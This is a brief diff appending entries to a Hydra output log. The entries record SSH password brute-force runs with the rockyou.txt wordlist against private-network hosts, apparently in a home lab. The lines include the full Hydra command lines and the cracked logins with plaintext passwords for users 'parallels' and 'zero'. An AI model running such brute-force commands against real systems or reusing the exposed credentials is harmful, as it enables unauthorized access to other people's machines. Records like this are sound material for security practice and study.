@@ -40,3 +40,6 @@
 [22][ssh] host: 10.211.55.8   login: parallels   password: Cmonster2006
 # Hydra v9.5 run at 2023-08-06 13:41:45 on 192.168.1.13 ssh (hydra -l zero -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.13)
 [22][ssh] host: 192.168.1.13   login: zero   password: 21RussellLucy
+# Hydra v9.5 run at 2023-08-07 15:31:20 on 192.168.1.13 ssh (hydra -l zero -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.13)
+# Hydra v9.5 run at 2023-08-07 15:32:16 on 192.168.1.13 ssh (hydra -l zero -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.13)
+[22][ssh] host: 192.168.1.13   login: zero   password: 21RussellLucy
